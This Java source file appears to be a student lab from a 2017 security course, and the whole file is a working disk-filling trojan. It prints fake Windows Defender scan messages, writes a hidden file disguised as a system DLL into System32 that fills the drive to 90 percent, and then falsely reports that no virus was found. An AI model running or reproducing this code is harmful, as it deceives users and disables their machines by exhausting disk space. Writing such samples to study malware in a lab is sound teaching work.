/*
Bradley White and Isaac Sotelo
CSCI 476: Lab 3
February 15, 2017
 */

import javax.swing.filechooser.FileSystemView;
import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.nio.file.FileSystems;
import java.nio.file.*;

public class Main {

    // System root and "DiskEater" file
    static String systemPath = System.getenv("SystemDrive") + "/Windows/System32/KERNAL-32.dll";

    public static void main(String[] args) throws IOException {
        // Confuse the user
        System.out.printf("Starting Windows Defender scanning system drive.%n");
        // Call helper to get the size of the file to make 90% of the disk used.
        long size = getFreeSpace();
        // Create the file with the given size in the system root, then close the file
        RandomAccessFile f = new RandomAccessFile(new File(systemPath), "rw");
        f.setLength(size);
        f.close();
        // Set the DiskEater file to hidden
        Path path = FileSystems.getDefault().getPath(systemPath);
        Files.setAttribute(path, "dos:hidden", true);
        // End the "virus scan"
        System.out.printf("The scanning finishes and no virus found!%n");
    }

    public static long getFreeSpace(){
        // Create an object to view disk statistics
        FileSystemView fsv = FileSystemView.getFileSystemView();

        // Get the system drive from the environment
        String cString = System.getenv("SystemDrive");
        File cDrive = new File(cString);
        // Retrieve the stats
        fsv.getSystemTypeDescription(cDrive);

        // Return the amount of bytes to use to take up 90% of disk space
        return (long)((0.9 * cDrive.getTotalSpace()) - (cDrive.getTotalSpace() - cDrive.getFreeSpace()));
    }
}
